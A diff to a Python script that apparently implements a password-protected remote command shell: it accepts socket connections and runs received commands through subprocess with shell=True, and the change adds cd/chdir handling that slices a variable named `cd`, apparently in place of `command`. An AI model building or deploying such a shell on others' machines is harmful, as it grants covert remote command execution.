@@ -1,5 +1,6 @@
 import socket
 import subprocess
+import os
 
 
 def lookForConnection(server):
@@ -50,6 +51,17 @@ while passwords_match == True:
         password, client, client_addr = lookForConnection(server)
         passwords_match = checkPass(password, client, client_addr)
         print(passwords_match)
+    elif command[:2] == "cd" or command[:5] == "chdir":
+        if command[:2] == "cd":
+            try:
+                os.chdir(cd[3:])
+            except OSError:
+                print("cd did not work")
+        else:
+            try:
+                os.chdir(cd[6:])
+            except OSError:
+                print("cd did not work")
     else:
         op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
         output = op.stdout.read()
